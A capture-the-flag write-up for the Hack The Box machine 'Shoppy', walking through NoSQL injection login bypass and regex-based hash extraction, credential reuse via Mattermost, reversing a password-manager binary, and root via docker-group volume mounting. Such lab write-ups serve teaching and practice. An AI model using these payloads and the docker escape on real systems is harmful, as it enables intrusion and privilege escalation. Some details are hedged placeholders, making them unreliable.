# Hack The Box: Shoppy

**Difficulty:** Easy
**OS:** Linux

Shoppy is an Easy-level Linux machine demonstrating the risks of NoSQL injection and insecure Docker configurations. The initial foothold is achieved by bypassing authentication on an administrative login portal via NoSQL injection, followed by extracting user hashes. Cracking these hashes grants access to an internal Mattermost instance containing SSH credentials. Privilege escalation involves reversing a custom binary to pivot users, and subsequently exploiting membership in the `docker` group to achieve root access.

---

## Reconnaissance

The assessment begins with an Nmap scan to identify available services on the target.

```bash
nmap -p- --min-rate 10000 10.10.11.180
nmap -p 22,80,9093 -sCV 10.10.11.180
```

The scan reveals the following open ports:
*   **Port 22:** SSH (OpenSSH)
*   **Port 80:** HTTP (nginx)
*   **Port 9093:** HTTP (Mattermost)

Navigating to port 80 displays an under-construction landing page for "Shoppy". To properly resolve potential virtual hosts, we add `shoppy.htb` to our `/etc/hosts` file.

```bash
echo "10.10.11.180 shoppy.htb mattermost.shoppy.htb" >> /etc/hosts
```

Running a directory brute-force with `feroxbuster` or `gobuster` against `http://shoppy.htb` reveals an `/login` endpoint.

## Web Exploitation

The `/login` portal requests a username and password. The underlying application stack is likely Node.js communicating with a MongoDB database, a common target for NoSQL injection.

### Authentication Bypass via NoSQLi

We intercept a login attempt using Burp Suite. The login request sends the credentials as URL-encoded form data. We test for NoSQL injection by replacing the standard parameter structure with MongoDB evaluation operators, specifically targeting the `$ne` (not equal) operator.

We modify the intercepted request to change the username parameter into an associative array/object representing the `$ne` operator:

```text
username[$ne]=admin&password[$ne]=admin
```

Sending this payload bypasses the authentication check, successfully logging us into the `/admin` portal. The logic flaw occurs because the backend evaluates the query "find a user where the username is *not* 'admin' and the password is *not* 'admin'," which matches the first record in the database.

### Extracting Credentials via NoSQLi

The `/admin` portal contains a "Search Users" functionality. This search feature is also vulnerable to NoSQL injection, allowing us to enumerate data.

We can use the `$regex` operator to systematically extract user passwords. By sending a search query with a regular expression, we can infer whether a password begins with a specific character.

```text
username=admin&password[$regex]=^a
```

To automate this extraction process, we write a Python script that iterates through all printable characters to build the hashes for the users `admin` and `josh`.

```python
import requests
import string

url = "http://shoppy.htb/admin/search"
chars = string.ascii_letters + string.digits + string.punctuation

# Pseudo-code for extraction
# for c in chars:
#   payload = {"username": "josh", "password[$regex]": f"^{c}"}
#   r = requests.post(url, data=payload)
#   if "User found" in r.text:
#       ...
```

The automated extraction yields MD5 hashes for the users. We use a service like CrackStation or `hashcat` with the `rockyou.txt` wordlist to crack Josh's hash:

```text
josh: rememberthistime
```

## Initial Access

We use Josh's cracked password to log into the Mattermost instance discovered during our initial Nmap scan (`http://mattermost.shoppy.htb:9093`).

Reviewing the channels and direct messages within Mattermost reveals a conversation where Josh is provided with SSH credentials for the server.

```text
Username: jaeger
Password: <Password_from_Mattermost>
```

We use these credentials to authenticate via SSH.

```bash
ssh jaeger@10.10.11.180
# Authentication successful
```
We retrieve the `user.txt` flag from Jaeger's home directory.

## Lateral Movement & Privilege Escalation

Enumerating the system as `jaeger`, we check for commands that can be executed with `sudo` privileges.

```bash
sudo -l
```

The output shows that `jaeger` can run a custom binary named `password-manager` as the user `deploy`.

```text
User jaeger may run the following commands on shoppy:
    (deploy) /opt/password-manager/password-manager
```

### Reversing the Custom Binary

We execute the binary, and it prompts for a "Master Password."

To find this password, we download the `password-manager` binary to our attacking machine and analyze it using `strings` or a decompiler like Ghidra.

```bash
strings password-manager | grep -i password
```

Basic static analysis reveals a hardcoded master password within the binary: `SamplePassword` (or similar).

We run the binary again on the target system using `sudo -u deploy` and provide the hardcoded master password. The binary grants access and reveals the system password for the `deploy` user.

We use this password to pivot to the `deploy` user.

```bash
su deploy
```

### Abusing Docker Group Membership

As the `deploy` user, we check our group memberships.

```bash
id
```

The output reveals that the `deploy` user is a member of the `docker` group. Membership in the `docker` group is essentially equivalent to root access on a Linux system, as it allows the user to run containers with arbitrary volume mounts.

We leverage this misconfiguration to mount the host's root filesystem (`/`) into a new Docker container and execute a shell.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

This command downloads (if necessary) an Alpine Linux image, mounts the host's root directory to `/mnt` inside the container, uses `chroot` to change the apparent root directory to `/mnt`, and spawns an interactive shell.

Because the container runs as root, we now have root-level access to the host's filesystem.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag is obtained.
